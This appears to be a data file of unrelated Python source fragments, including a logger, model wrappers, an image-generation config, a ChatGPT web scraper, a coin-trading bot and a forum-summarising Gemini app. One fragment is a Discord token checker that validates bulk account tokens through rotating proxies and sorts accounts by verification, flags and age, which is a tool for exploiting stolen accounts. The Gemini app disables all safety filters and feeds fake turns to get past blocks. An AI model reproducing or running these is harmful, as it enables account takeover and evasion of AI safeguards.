\u5206\u5e03\u5f0f\u8bad\u7ec3\u4e0b\uff0c\u4ec5\u5728 rank 0 \u8f93\u51fa\u8b66\u544a\n    logger.rank_zero_warning('your msg')\n\n\"\"\"\n\n\nimport logging\nimport logging.config\nfrom logging import DEBUG, ERROR, INFO, WARNING, CRITICAL, raiseExceptions\nimport os\nimport sys\nimport warnings\nfrom pathlib import Path\nfrom typing import Optional, Union\nfrom rich.logging import RichHandler\nimport datetime\nimport torch\n\n__all__ = [\n    'logger'\n]\n\nfrom .handler import StdoutStreamHandler, TqdmLoggingHandler\n\n\nROOT_NAME = 'LOMO'\n\n\nclass LoggerSingleton(type):\n    _instances = {}\n\n    def __call__(cls, *args, **kwargs):\n        if cls not in cls._instances:\n            cls._instances[cls] = super(LoggerSingleton, cls).__call__(*args, **kwargs)\n        return cls._instances[cls]\n\n\nclass LOMOLogger(logging.Logger, metaclass=LoggerSingleton):\n    def __init__(self, name):\n        super().__init__(name)\n        self._warning_msgs = set()\n\n    def add_file(self, path: Optional[Union[str, Path]] = None, level='AUTO', remove_other_handlers: bool = False,\n                 mode: str = \"w\"):\n        \"\"\"\n        \u5c06\u65e5\u5fd7\u8f93\u51fa\u5230 path \u4e2d\u3002\n\n        :param path: \u82e5 path \u4e3a\u6587\u4ef6\u8def\u5f84\uff08\u901a\u8fc7 path \u662f\u5426\u5305\u542b\u540e\u7f00\u5224\u5b9a path \u662f\u5426\u8868\u793a\u6587\u4ef6\u540d\uff0c\u4f8b\u5982 output.log \u4f1a\u88ab\u8ba4\u4e3a\u662f\u6587\u4ef6\uff0c\u800c\n                output \u5219\u8ba4\u4e3a\u662f\u6587\u4ef6\u5939\uff09\u5219\u76f4\u63a5\u5199\u5165\u5230\u7ed9\u5b9a\u6587\u4ef6\u4e2d\uff1b\u5982\u679c\u5224\u5b9a\u4e3a\u6587\u4ef6\u5939\uff0c\u5219\u662f\u5728\u8be5\u6587\u4ef6\u5939\u4e0b\u4ee5 \u65f6\u95f4\u6233 \u521b\u5efa\u4e00\u4e2a\u65e5\u5fd7\u6587\u4ef6\u3002\n        :param level: \u53ef\u9009 ['INFO', 'WARNING', 'DEBUG', 'ERROR', 'AUTO'], \u5176\u4e2dAUTO\u8868\u793a\u6839\u636e\u73af\u5883\u53d8\u91cf\"LOMO_LOG_LEVEL'\u8fdb\u884c\n            \u8bbe\u7f6e\u3002\n        :param remove_other_handlers: \u662f\u5426\u79fb\u9664\u5176\u5b83 handler \uff0c\u5982\u679c\u79fb\u9664\uff0c\u5219terminal\u4e2d\u5c06\u4e0d\u4f1a\u6709 log \u8f93\u51fa\u3002\n        :param mode: \u53ef\u9009\u4e3a['w', 'a']\uff0c\u5982\u679c\u4f20\u5165\u7684 path \u662f\u5b58\u5728\u7684\u6587\u4ef6\uff0c'w' \u4f1a\u8986\u76d6\u539f\u6709\u5185\u5bb9 'a' \u5219\u4f1a\u5728\u6587\u4ef6\u7ed3\u5c3e\u5904\u7ee7\u7eed\u6dfb\u52a0\u3002\n        :return:\n        \"\"\"\n        r\"\"\"\u6dfb\u52a0\u65e5\u5fd7\u8f93\u51fa\u6587\u4ef6\u548c\u8f93\u51fa\u7ea7\u522b\"\"\"\n        if level == 'AUTO':\n            level = parse_level()\n        return _add_file_handler(self, path, level, remove_other_handlers, mode)\n\n    def set_stdout(self, stdout: str = 'raw', level: str = 'AUTO'):\n        \"\"\"\n        \u8bbe\u7f6e log \u7684 terminal \u8f93\u51fa\u5f62\u5f0f\u3002\n\n        :param stdout: \u53ef\u9009['rich', 'naive', 'raw', 'none']\u3002\n        :param level: \u53ef\u9009 ['INFO', 'WARNING', 'DEBUG', 'ERROR', 'AUTO'], \u5176\u4e2dAUTO\u8868\u793a\u6839\u636e\u73af\u5883\u53d8\u91cf\"LOMO_LOG_LEVEL'\u8fdb\u884c\n            \u8bbe\u7f6e\u3002\n        :return:\n        \"\"\"\n        r\"\"\"\u8bbe\u7f6e\u6807\u51c6\u8f93\u51fa\u683c\u5f0f\u548c\u8f93\u51fa\u7ea7\u522b\"\"\"\n        if level == 'AUTO':\n            level = parse_level()\n        return _set_stdout_handler(self, stdout, level)\n\n    def debug(self, msg, *args, **kwargs):\n        \"\"\"\n        Delegate a debug call to the underlying log.\n        \"\"\"\n        if self.isEnabledFor(DEBUG):\n            kwargs = self._add_rank_info(kwargs)\n            self._log(DEBUG, msg, args, **kwargs)\n\n    def info(self, msg, *args, **kwargs):\n        \"\"\"\n        Delegate an info call to the underlying log.\n        \"\"\"\n        if self.isEnabledFor(INFO):\n            kwargs = self._add_rank_info(kwargs)\n            self._log(INFO, msg, args, **kwargs)\n\n    def warning(self, msg, *args, **kwargs):\n        \"\"\"\n        Delegate a warning call to the underlying log.\n        \"\"\"\n        if self.isEnabledFor(WARNING):\n            kwargs = self._add_rank_info(kwargs)\n            self._log(WARNING, msg, args, **kwargs)\n\n    def warning_once(self, msg, *args, **kwargs):\n        \"\"\"\n        \u76f8\u540c\u7684 warning \u5185\u5bb9\u53ea\u4f1a warning \u4e00\u6b21\n\n        :param msg:\n        :param args:\n        :param kwargs:\n        :return:\n        \"\"\"\n        if msg not in self._warning_msgs:\n            if self.isEnabledFor(WARNING):\n                kwargs = self._add_rank_info(kwargs)\n                self._log(WARNING, msg, args, **kwargs)\n            self._warning_msgs.add(msg)\n\n    def rank_zero_warning(self, msg, *args, once=False, **kwargs):\n        \"\"\"\n        \u53ea\u5728 rank 0 \u4e0a warning \u3002\n\n        :param msg:\n        :param args:\n        :param once: \u662f\u5426\u53ea warning \u4e00\u6b21\n        :param kwargs:\n        :return:\n        \"\"\"\n        if os.environ.get('LOCAL_RANK', 0) == 0:\n            if once:\n                if msg in self._warning_msgs:\n                    return\n                self._warning_msgs.add(msg)\n\n            if self.isEnabledFor(WARNING):\n                kwargs = self._add_rank_info(kwargs)\n                self._log(WARNING, msg, args, **kwargs)\n\n    def warn(self, msg, *args, **kwargs):\n        if self.isEnabledFor(WARNING):\n            kwargs = self._add_rank_info(kwargs)\n            self._log(WARNING, msg, args, **kwargs)\n\n    def error(self, msg, *args, **kwargs):\n        \"\"\"\n        Delegate an error call to the underlying log.\n        \"\"\"\n        if self.isEnabledFor(ERROR):\n            kwargs = self._add_rank_info(kwargs)\n            self._log(ERROR, msg, args, **kwargs)\n\n    def exception(self, msg, *args, exc_info=True, **kwargs):\n        \"\"\"\n        Delegate an exception call to the underlying log.\n        \"\"\"\n        kwargs",
    "\nfrom bitnet.models.model import Model\nfrom transformers import LlamaTokenizer\nfrom transformers import TextStreamer\n\nfrom .stopping_criteria import StoppingTokenCriteria\nfrom .causal_lm import BitnetForCausalLM\n\nclass BitNetLLM(Model):\n    def __init__(self, model_name):\n        self.model_name = model_name\n        super().__init__()\n        \n    def _build(self):\n        print(f\"Loading model {self.model_name}...\")\n        self.tokenizer = LlamaTokenizer.from_pretrained(self.model_name, trust_remote_code=True)\n        self.model = BitnetForCausalLM.from_pretrained(self.model_name).to(\"cuda\")\n\n    # Function to run the model on a single example\n    def _predict(self, data):\n        if not 'prompt' in data:\n            raise ValueError(\"Prompt is required to run the model.\")\n\n        prompt = data[\"prompt\"]\n\n        # Stop token\n        stopping_criteria = StoppingTokenCriteria(stop_token=\"\ud83d\udc02\", tokenizer=self.tokenizer)\n\n        # Tokenize the data\n        model_inputs = self.tokenizer(prompt, return_tensors=\"pt\").to(\"cuda\")\n\n        # Stream the results to the terminal so we can see it generating\n        streamer = TextStreamer(self.tokenizer)\n\n        generated_ids = self.model.generate(\n            **model_inputs,\n            streamer=streamer,\n            max_new_tokens=50,\n            stopping_criteria=stopping_criteria\n        )\n\n        decoded = self.tokenizer.batch_decode(generated_ids, skip_special_tokens=True)\n        answer = decoded[0][:-1]\n        answer = answer.replace(prompt, \"\").strip()\n        \n        is_correct = False\n        if 'answers' in data:\n            is_correct = answer.lower() in [d.lower() for d in data[\"answers\"]]\n            if data['answers'] == []:\n                if \"not in context\" in answer.lower():\n                    is_correct = True\n\n        return {\n            \"prompt\": prompt,\n            \"guess\": answer,\n            \"is_correct\": is_correct,\n            \"model\": self.model_name\n        }\n",
    "\r\nimport os\r\nStable_diff_api=\"http://192.168.101.13:7861\"\r\n\r\n# \u6b64\u5904\u53ef\u4ee5\u6dfb\u52a0\u989d\u5916\u7684\u914d\u7f6e\r\nStable_diff_conf={\r\n    # \u652f\u6301payload\u4e2d\u7684\u53c2\u6570\u76f4\u63a5\u5199\u5165,\u4f1a\u6539\u53d8\u751f\u6210\u56fe\u7247\u7684\u6548\u679c\u5982:\r\n    #   \"enable_hr\": false,\r\n    #   \"denoising_strength\": 0,\r\n    #   \"firstphase_width\": 0,\r\n}\r\n\r\n# \u914d\u7f6eImageMagick\u7684\u8def\u5f84\r\nx= r\"C:\\Program Files\\ImageMagick-7.1.1-Q16-HDRI\\magick.exe\"\r\n\r\n\r\n\r\n# \u6b64\u5904\u7528\u4e8e\u7ed9\u751f\u6210\u6bcf\u5f20\u56fe\u7247\u7684\u65f6\u5019\u90fd\u6dfb\u52a0\u7684\u4fee\u9970\u5173\u952e\u5b57,\u6bd4\u5982\"4K \u9ad8\u6e05 \u67d4\u548c......\"\r\n# \u4f8b\u5b50:\r\n# ADDER_PROMOTE=\"\u67d4\u548c, \u53e4\u98ce\"\r\n\r\nADDER_PROMOTE=\"\"\r\n\r\n\r\n\r\n# \u6570\u7ec4\u4ece1\u5f00\u59cb\r\n# payload = {\r\n#   \"enable_hr\": false,\r\n#   \"denoising_strength\": 0,\r\n#   \"firstphase_width\": 0,\r\n#   \"firstphase_height\": 0,\r\n#   \"hr_scale\": 2,\r\n#   \"hr_upscaler\": \"string\",\r\n#   \"hr_second_pass_steps\": 0,\r\n#   \"hr_resize_x\": 0,\r\n#   \"hr_resize_y\": 0,\r\n#   \"prompt\": \"\",     #  \u63d0\u793a\u8bcd\r\n#   \"styles\": [\r\n#     \"string\"\r\n#   ],\r\n#   \"seed\": -1,\r\n#   \"subseed\": -1,\r\n#   \"subseed_strength\": 0,\r\n#   \"seed_resize_from_h\": -1,\r\n#   \"seed_resize_from_w\": -1,\r\n#   \"sampler_name\": \"string\",\r\n#   \"batch_size\": 1,\r\n#   \"n_iter\": 1,\r\n#   \"steps\": 50,\r\n#   \"cfg_scale\": 7,\r\n#   \"width\": 512,\r\n#   \"height\": 512,\r\n#   \"restore_faces\": false,\r\n#   \"tiling\": false,\r\n#   \"do_not_save_samples\": false,\r\n#   \"do_not_save_grid\": false,\r\n#   \"negative_prompt\": \"string\",     #  \u8d1f\u9762\u63d0\u793a\u8bcd\r\n#   \"eta\": 0,\r\n#   \"s_churn\": 0,\r\n#   \"s_tmax\": 0,\r\n#   \"s_tmin\": 0,\r\n#   \"s_noise\": 1,\r\n#   \"override_settings\": {},\r\n#   \"override_settings_restore_afterwards\": true,\r\n#   \"script_args\": [],\r\n#   \"sampler_index\": \"Euler\",\r\n#   \"script_name\": \"string\",\r\n#   \"send_images\": true,\r\n#   \"save_images\": false,\r\n#   \"alwayson_scripts\": {}\r\n# }\r\n",
    "#@Autor: Felipe Frechiani de Oliveira\n#Este programa acessa o site do chatgpt e faz uma pergunta e captura a resposta por meio de um servidor do selenium.\n#Somente funcionou usando o firefox com o chrome n\u00e3o funcionou.  \n\nfrom selenium import webdriver\nimport time\nfrom selenium.common.exceptions import NoSuchElementException\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.firefox.options import Options\nfrom selenium.webdriver.common.action_chains import ActionChains\n\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nimport json\nfrom urllib.parse import urlparse, parse_qs\n\n\n\n\n\n# Fun\u00e7\u00e3o para fazer uma pergunta ao ChatGPT\ndef ask_gpt(question):\n\n    # Configura\u00e7\u00f5es do Selenium para se conectar a um servi\u00e7o Selenium remoto\n    selenium_host = 'selenium'  # Atualize com o endere\u00e7o IP ou o nome do host do seu servi\u00e7o Selenium remoto\n    selenium_port = '4444'  # Atualize com a porta em que o servi\u00e7o Selenium remoto est\u00e1 sendo executado\n    # URL da p\u00e1gina do ChatGPT\n    url = \"https://chat.openai.com/\"\n    print(\"Accessando url do chatgpt:\" + url)\n    print(\"Usando o broswer firefox...\")\n    # Configura\u00e7\u00e3o do WebDriver remoto\n    webdriver_remote_url = f\"http://{selenium_host}:{selenium_port}/wd/hub\"\n    print(\"Roda do selenium:\" + webdriver_remote_url)\n    firefox_options = Options()\n    browser = webdriver.Remote(webdriver_remote_url, options=firefox_options)\n\n    # Abre a p\u00e1gina do ChatGPT\n    try:   \n\n        browser.get(url)\n        print(\"URL da pagina:\" + browser.current_url)\n        print(\"Titulo da pagina:\" + browser.title)\n        time.sleep(2)  # Espera 3 segundos para garantir que a p\u00e1gina esteja carregada\n        # Insere a pergunta no campo de entrada\n        if browser is not None:       \n            input_field = browser.find_element(By.ID , \"prompt-textarea\")\n            #print(input_field)\n            actions = ActionChains(browser)\n            # Clica no bot\u00e3o\n            actions.click(input_field).perform()\n            input_field.send_keys(question)\n            # Clica no bot\u00e3o de enviar\n            submit_button = browser.find_element(By.XPATH , '//button[@data-testid=\"send-button\"]')\n            time.sleep(1)  # Espera 5 segundos para a resposta ser gerada\n            browser.save_screenshot(\"tela_antes_da_resposta.png\")\n            submit_button.click()\n            print(\"aguardando resposta\")\n            # Aguarda a resposta do ChatGPT\n            time.sleep(4)  # Espera 5 segundos para a resposta ser gerada\n            browser.save_screenshot(\"tela_depois_da_resposta.png\")\n            # Obt\u00e9m a resposta\n            response = browser.find_element(By.XPATH ,'//div[@data-message-author-role=\"assistant\"]').text\n            return response\n    except NoSuchElementException:\n        print(\"Elemento n\u00e3o encontrado na p\u00e1gina.\")   \n    \n\nclass RequestHandler(BaseHTTPRequestHandler):\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        post_params = parse_qs(post_data.decode('utf-8'))\n\n        if 'question' in post_params:\n            question = post_params['question'][0]\n            response = ask_gpt(question)  # Suponha que get_gpt_response seja sua fun\u00e7\u00e3o para interagir com o ChatGPT\n            self.send_response(200)\n            self.send_header('Content-type', 'application/json')\n            self.end_headers()\n            self.wfile.write(json.dumps({'response': response}).encode())\n        else:\n            self.send_response(400)\n            self.end_headers()\n            self.wfile.write(b'Bad Request')\n\ndef run(server_class=HTTPServer, handler_class=RequestHandler, port=8000):\n    server_address = ('', port)\n    httpd = server_class(server_address, handler_class)\n    print(f'Starting server on port {port}...')\n    httpd.serve_forever()\n    \n    \n    \n    \n\nif __name__ == \"__main__\":\n    run()\n\n\n\n\n",
    "import torch\n\nfrom utils.general import check_version\n\nTORCH_1_10 = check_version(torch.__version__, '1.10.0')\n\n\ndef make_anchors(feats, strides, grid_cell_offset=0.5):\n    \"\"\"Generate anchors from features.\"\"\"\n    anchor_points, stride_tensor = [], []\n    assert feats is not None\n    dtype, device = feats[0].dtype, feats[0].device\n    for i, stride in enumerate(strides):\n        _, _, h, w = feats[i].shape\n        sx = torch.arange(end=w, device=device, dtype=dtype) + grid_cell_offset  # shift x\n        sy = torch.arange(end=h, device=device, dtype=dtype) + grid_cell_offset  # shift y\n        sy, sx = torch.meshgrid(sy, sx, indexing='ij') if TORCH_1_10 else torch.meshgrid(sy, sx)\n        anchor_points.append(torch.stack((sx, sy), -1).view(-1, 2))\n        stride_tensor.append(torch.full((h * w, 1), stride, dtype=dtype, device=device))\n    return torch.cat(anchor_points), torch.cat(stride_tensor)\n\n\ndef dist2bbox(distance, anchor_points, xywh=True, dim=-1):\n    \"\"\"Transform distance(ltrb) to box(xywh or xyxy).\"\"\"\n    lt, rb = torch.split(distance, 2, dim)\n    x1y1 = anchor_points - lt\n    x2y2 = anchor_points + rb\n    if xywh:\n        c_xy = (x1y1 + x2y2) / 2\n        wh = x2y2 - x1y1\n        return torch.cat((c_xy, wh), dim)  # xywh bbox\n    return torch.cat((x1y1, x2y2), dim)  # xyxy bbox\n\n\ndef bbox2dist(anchor_points, bbox, reg_max):\n    \"\"\"Transform bbox(xyxy) to dist(ltrb).\"\"\"\n    x1y1, x2y2 = torch.split(bbox, 2, -1)\n    return torch.cat((anchor_points - x1y1, x2y2 - anchor_points), -1).clamp(0, reg_max - 0.01)  # dist (lt, rb)\n",
    "import utils.logger as logger\r\nimport concurrent.futures\r\nfrom colorama import *\r\nfrom pystyle import *\r\nimport tls_client\r\nimport threading\r\nimport colorama\r\nimport os, sys\r\nimport random\r\nimport ctypes\r\nimport msvcrt\r\nimport toml\r\nimport time\r\nimport json\r\n\r\n\r\n\r\ncolorama.init()\r\n\r\nconfig = toml.load(\"data/config.toml\")\r\nsettings = json.loads(open(\"data/settings.json\", \"r\").read())\r\n\r\nwith open(\"data/tokens.txt\", \"r\") as f:\r\n    tokens = f.readlines()\r\n\r\nwith open(\"data/proxies.txt\", \"r\") as f:\r\n    proxies = f.readlines()\r\n\r\ntokens = list(set(tokens))\r\n\r\nLOCK = threading.Lock()\r\nvalid = 0\r\ninvalid = 0\r\nlocked = 0\r\nnitro = 0\r\nflagged = 0\r\ntotal = len(tokens)\r\ncurrent = 0\r\ndone = False\r\n\r\n\r\n\r\n\r\nos.system('cls')\r\n\r\noutput_folder = f\"output/{time.strftime('%Y-%m-%d %H-%M-%S')}\"\r\nif not os.path.exists(output_folder):\r\n    os.makedirs(output_folder)\r\n\r\nstart = time.time()\r\n\r\nclass Checker:\r\n    def __init__(self) -> None: # Fuck this shit *_*\r\n        self.session = tls_client.Session(\r\n            client_identifier=\"chrome_104\"\r\n        )\r\n        self.session.headers = {\r\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\"\r\n        }\r\n        self.update_proxy() #buttsex\r\n    \r\n    def update_proxy(self):\r\n        if not config[\"main\"][\"proxyless\"]:\r\n            self.session.proxies = f\"http://{random.choice(proxies).strip()}\" #proxy handling!\r\n       \r\n    \r\n    def check(self) -> None:\r\n        global current, total, valid, locked, nitro, invalid, flagged\r\n\r\n        while True:\r\n            if len(tokens) == 0:\r\n                break\r\n            token = tokens.pop().strip() # .gg/pop\r\n            try:\r\n                token_only = token.split(\":\")[-1]\r\n                self.session.headers[\"Authorization\"] = token_only\r\n\r\n\r\n                r = self.session.get(f\"https://discord.com/api/v9/users/@me/guilds\")\r\n                if r.status_code == 429:\r\n                    logger.err(\"Rate limited\", token=token_only.split(\".\")[0])\r\n                    self.update_proxy()\r\n                    tokens.append(token)\r\n                    continue\r\n\r\n                current += 1\r\n\r\n                if r.status_code == 401:\r\n                    invalid += 1\r\n                    logger.err(\"Invalid\", token=token_only.split(\".\")[0])\r\n                    LOCK.acquire()\r\n                    with open(f\"{output_folder}/invalid.txt\", \"a\") as f:\r\n                        f.write(token + \"\\n\")\r\n                    LOCK.release()\r\n                    continue\r\n\r\n                if r.status_code == 403:\r\n                    locked += 1\r\n                    logger.err(\"Locked\", token=token_only.split(\".\")[0])\r\n                    LOCK.acquire()\r\n                    with open(f\"{output_folder}/locked.txt\", \"a\") as f:\r\n                        f.write(token + \"\\n\")\r\n                    LOCK.release()\r\n\r\n                if r.status_code == 200:\r\n\r\n\r\n                    # get discord account flags\r\n                    r = self.session.get(f\"https://discord.com/api/v9/users/@me\")\r\n                    args = {\r\n                        \"token\": token_only.split(\".\")[0],\r\n                    }\r\n\r\n                    if settings[\"flagged\"]:\r\n                        if r.json()[\"flags\"] & 1048576 == 1048576:\r\n                            flagged += 1\r\n                            logger.err(\"Flagged\", **args)\r\n                            LOCK.acquire()\r\n                            with open(f\"{output_folder}/flagged.txt\", \"a\") as f:\r\n                                f.write(token + \"\\n\")\r\n                            LOCK.release()\r\n                            continue\r\n\r\n                    if settings[\"type\"]:\r\n                        LOCK.acquire()\r\n                        type = \"unclaimed\"\r\n                        if r.json()[\"email\"] != None:\r\n                            type = \"email verified\"\r\n                        if r.json()[\"phone\"] != None:\r\n                            if type == \"email verified\":\r\n                                type = \"fully verified\"\r\n                            else:\r\n                                type = \"phone verified\"\r\n                    else:\r\n                        type = \"valid\"\r\n\r\n                    args[\"type\"] = type\r\n                    LOCK.release()\r\n\r\n\r\n                    if settings[\"age\"]:\r\n                        created_at = ((int(r.json()[\"id\"]) >> 22) + 1420070400000) / 1000\r\n                        age = (time.time() - created_at) / 86400 / 30\r\n                        if age > 12:\r\n                            args[\"age\"] = f\"{age/12:.0f} years\"\r\n                        else:\r\n                            args[\"age\"] = f\"{age:.0f} months\"\r\n\r\n                        if not os.path.exists(f\"{output_folder}/age/{args['age']}\"):\r\n                            os.makedirs(f\"{output_folder}/age/{args['age']}\")\r\n                        \r\n                        with open(f\"{output_folder}/age/{args['age']}/{ty",
    "import requests\nimport json\nimport time\nfrom datetime import datetime\n\n\ndef delay():\n    time.sleep(0.5)\n\n\nclass AutoCoin:\n    def __init__(self):\n        # \uc785\ub825 \ubc1b\ub294 \uac12\n        self.username = input(\"\ubd80\ub9c8\uc704\ud0a4 \uc544\uc774\ub514 \uc785\ub825: \")\n        self.password = input(\"\ubd80\ub9c8\uc704\ud0a4 \ube44\ubc00\ubc88\ud638 \uc785\ub825: \")\n        self.want_buy_price = input(\"\uc6d0\ud558\ub294 \ub9e4\uc218 \uac00\uaca9 \uc544\ub798\ub85c: \")\n        self.want_sell_price = input(\"\uc6d0\ud558\ub294 \ub9e4\ub3c4 \uac00\uaca9 \uc704\ub85c: \")\n\n        self.access_token = None\n        self.access_refreshToken = None\n\n        self.price = 0\n        self.property = 0  # \ud604\uc7ac \uc7ac\uc0b0\n        self.have_coins = 0  # \ud604\uc7ac \ubcf4\uc720 \ucf54\uc778 \uc218\n\n        # URL list\n        self.urls = {\n            \"bsm_login\": \"https://auth.bssm.kro.kr/api/auth/login\",  # \ubd80\ub9c8\uc704\ud0a4\uc5d0 \uc811\uadfc\ud558\uae30 \uc704\ud55c token \uac00\uc838\uc634\n            \"bsm_auth_token\": \"https://auth.bssm.kro.kr/api/oauth/authorize\",  # bsm token\n            \"buma_auth_token\": \"https://buma.wiki/api/auth/oauth/bsm\",  # buman token\n            \"mine\": \"https://buma.wiki/api/coins/mine\",\n            \"coin_price\": \"https://buma.wiki/api/coins/prices\",  # \ubd80\ub9c8\uc704\ud0a4 \ucf54\uc778 \uac00\uaca9 \ud655\uc778\n            \"buy_coin\": \"https://buma.wiki/api/coins/buy\",  # \ucf54\uc778 \ub9e4\uc218\n            \"sell_coin\": \"https://buma.wiki/api/coins/sell\"  # \ucf54\uc778 \ub9e4\ub3c4\n        }\n\n    def show_user_info(self):  # \uc720\uc800\uac00 \uc785\ub825\ud55c \uc815\ubcf4 \ud655\uc778\ud558\ub294 \ud398\uc774\uc9c0\n        text = f\"\"\"\n        \\n\n        ## \uc785\ub825\ub41c \uc815\ubcf4\ub294 \ub2e4\uc74c\uacfc \uac19\uc2b5\ub2c8\ub2e4. ## \n\n        \uc720\uc800 \uc774\ub984: {self.username}\n        \uc6d0\ud558\ub294 \ub9e4\uc218 \uac00\uaca9 \uc774\ud558 \uac12: {self.want_buy_price}\n        \uc6d0\ud558\ub294 \ub9e4\ub3c4 \uac00\uaca9 \uc774\uc0c1 \uac12: {self.want_sell_price}\n\n        \"\"\"\n        print(text)\n\n    def main(self):  # \ubd80\ub9c8\uc704\ud0a4 \ub85c\uadf8\uc778 \ud568\uc218\n        try:\n            login_data = {\n                \"id\": str(self.username),\n                \"pw\": str(self.password)\n            }\n            login_response = requests.post(str(self.urls[\"bsm_login\"]), json=login_data)\n\n            if login_response.status_code == 200:\n                login_json_response = login_response.json()\n                self.access_token = login_json_response.get(\"accessToken\")\n                self.access_refreshToken = login_json_response.get(\"refreshToken\")\n\n                # self.show_user_info()\n\n                self.get_token()\n                self.mine()\n                self.get_coin_price()\n\n                if self.price <= int(self.want_buy_price):\n                    self.buy()\n\n                if self.price >= int(self.want_sell_price):\n                    self.sell()\n\n                time.sleep(180)\n\n            else:\n                print(\"\uc720\uc800 \uc815\ubcf4\ub97c \ub2e4\uc2dc \ud655\uc778 \ubc14\ub78d\ub2c8\ub2e4.\")\n                exit()\n\n        except requests.exceptions.RequestException as e:\n            print(\"\uc11c\ubc84\uc5d0 \uc5f0\uacb0\ud560 \uc218 \uc5c6\uc74c.\")\n\n    def get_token(self):  # \ud1a0\ud070 \uac00\uc838\uc624\ub294 \ud568\uc218\n        headers = {\n            'Cookie': f'bsm_auth_refresh_token_v1={self.access_refreshToken}; bsm_auth_token_v1={self.access_token}',\n        }\n\n        data = {\"clientId\": \"22fb2e30\", \"redirectURI\": \"https://buma.wiki/oauth\"}\n        response_auth = requests.post(self.urls[\"bsm_auth_token\"], headers=headers, json=data)\n\n        text = response_auth.text\n        result = text[45:77]\n\n        # token \uc694\uccad\n        headers = {\n            'Cookie': f'bsm_auth_refresh_token_v1={self.access_refreshToken}; bsm_auth_token_v1={self.access_token}',\n            'Authcode': f'{result}',\n        }\n\n        data = {\"clientId\": \"22fb2e30\", \"redirectURI\": \"https://buma.wiki/oauth\"}\n        response_token = requests.post(self.urls[\"buma_auth_token\"], json=data, headers=headers)\n\n        data = response_token.text\n        parsed_data = json.loads(data)\n\n        self.access_token = parsed_data[\"accessToken\"]\n        # print(self.access_token) token \ud655\uc778\n\n    def get_coin_price(self):  # \ucf54\uc778 \uac00\uaca9 \uac00\uc838\uc624\ub294 \ud568\uc218\n        response = requests.get(self.urls[\"coin_price\"])\n\n        if response.status_code == 200:\n            json_data = response.json()\n            self.price = json_data[\"price\"]\n            print(f\"{datetime.now()}  \ucf54\uc778 \uac00\uaca9: {self.price}\")\n        else:\n            print('Failed to retrieve the page. Status code:', response.status_code)\n\n    def mine(self):\n        headers = {\n            \"Authorization\": f\"{self.access_token}\"\n        }\n\n        response = requests.get(self.urls[\"mine\"], headers=headers)\n\n        if response.status_code == 200:\n            json_data = response.json()\n            self.property = json_data[\"money\"]\n            self.have_coins = json_data[\"coin\"]\n        else:\n            print('Failed to retrieve the page. Status code:', response.status_code)\n\n    def buy(self):  # \ub9e4\uc218 \ud568\uc218\n        headers = {\n            \"Authorization\": f\"{self.access_token}\"\n        }\n\n        coin_data = {\n            'coinPrice': self.price,\n            'coinCount': self.property // self.price  # \uc804\uc7ac\uc0b0 // \ud604\uc7ac \uac00\uaca9 = \ud480\ub9e4\uc218\n        }\n\n        coin_response = requests.post(self.urls[\"buy_coin\"], json=coin_data, headers=headers)\n\n        if coin_response.status_code == 200:\n            print(f\"- \ucf54\uc778\uc744 {self.property // self.price}\uc8fc \ub9e4\uc218\ud558\uc600\uc2b5\ub2c8\ub2e4.\\n\")\n\n    def sell(self):  # \ub9e4\ub3c4 \ud568\uc218\n        headers = {\n            \"Authorization\": f\"{self.access_token}\"\n        }\n\n        coin_data = {\n            'coinCount': self.have_coins,\n            'coinPrice': self.price\n      ",
    "import streamlit as st\nimport google.generativeai as genai\nfrom google.generativeai.types import HarmCategory, HarmBlockThreshold\nfrom lib.four_chan import four_chan_scrape\nfrom lib.stage1st import S1_scraper\nfrom lib.nga import nga_scraper\nfrom lib.five_chan import five_chan_scraper\nimport re\nimport json\n\n# \u52a0\u8f7dprompts.json\u6587\u4ef6\nwith open(\"prompts.json\", \"r\") as file:\n    prompts = json.load(file)\n\ndef generate_content_with_context(initial_prompt, model_choice, max_attempts=3):\n    genai.configure(api_key=st.secrets[\"api_key\"])\n    model = genai.GenerativeModel(model_choice)\n    attempts = 0\n    messages = [{'role': 'user', 'parts': [initial_prompt]}]\n    st.write(f\"\u5df2\u4f20\u5165{len(initial_prompt) }\u5b57\")\n    while attempts < max_attempts:\n        response = model.generate_content(messages, safety_settings={\n            HarmCategory.HARM_CATEGORY_HATE_SPEECH: HarmBlockThreshold.BLOCK_NONE,\n            HarmCategory.HARM_CATEGORY_HARASSMENT: HarmBlockThreshold.BLOCK_NONE,\n            HarmCategory.HARM_CATEGORY_SEXUALLY_EXPLICIT: HarmBlockThreshold.BLOCK_NONE,\n            HarmCategory.HARM_CATEGORY_DANGEROUS_CONTENT: HarmBlockThreshold.BLOCK_NONE,\n        },generation_config=genai.types.GenerationConfig(temperature=1.0))\n\n        if 'block_reason' in str(response.prompt_feedback):\n            st.write(f\"\u88ab\u5c4f\u853d{attempts + 1}\u6b21: \u6b63\u5e38\u5c1d\u8bd5\u91cd\u65b0\u8f93\u51fa\u3002{response.prompt_feedback}\")\n            messages.append({'role':'model','parts':[\"\u8bf7\u6307\u793a\u6211\"]})\n            messages.append({'role': 'user', 'parts': [\"\u7ee7\u7eed\u751f\u6210\"]})\n            attempts += 1\n        else:\n            try:\n                if response.text:  # \u76f4\u63a5\u68c0\u67e5\u54cd\u5e94\u6587\u672c\u662f\u5426\u5b58\u5728\n                    return response.text, False\n                else:\n                    return \"\u6ca1\u6709\u751f\u6210\u5185\u5bb9\u3002\", True\n            except AttributeError as e:\n                return f\"\u54cd\u5e94\u89e3\u6790\u5931\u8d25\uff1a{e}\", True\n\n    return \"\u88ab\u5c4f\u853d\u592a\u591a\u6b21\uff0c\u5b8c\u86cb\u4e86\", True\n\n\ndef s1_link_replacement(match):\n    numbers = match.group(1).split(',')\n    links = [f'[[{num}]](https://bbs.saraba1st.com/2b/forum.php?mod=redirect&ptid={thread_id}&authorid=0&postno={num})' for num in numbers]\n    return ', '.join(links)\n\n# def nga_link_replacement(match):\n#     numbers = match.group(1).split(',')\n#     links = [f'[[{num}]](https://bbs.nga.cn/read.php?pid={thread_id}&opt={num})' for num in numbers]\n#     return ', '.join(links)\n\n# def five_chan_link_replacement(match):\n#     numbers = match.group(1).split(',')\n#     links = [f'[[{num}]](https://{sever}/test/read.cgi/{board}/{thread_id}/{num})' for num in numbers]\n#     return ', '.join(links)\n\ndef 